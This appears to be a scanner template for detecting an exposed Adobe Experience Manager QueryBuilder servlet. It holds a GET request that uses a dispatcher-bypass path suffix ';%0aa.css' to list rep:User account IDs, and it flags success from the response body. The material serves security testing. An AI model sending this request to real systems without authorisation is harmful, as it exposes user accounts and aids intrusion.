id: aem-jcr-querybuilder
brief:
    title: Query JCR role via QueryBuilder Servlet
    by: DhiyaneshDk
    level: info
    about: ""
    label:
        - aem
        - misconfig
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User'
      head:
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.5
      signs:
        - "on": status
          status:
            - 200
        - "on": word
          has:
            - '"success":true'
            - jcr:uuid
          in: body
          need: all
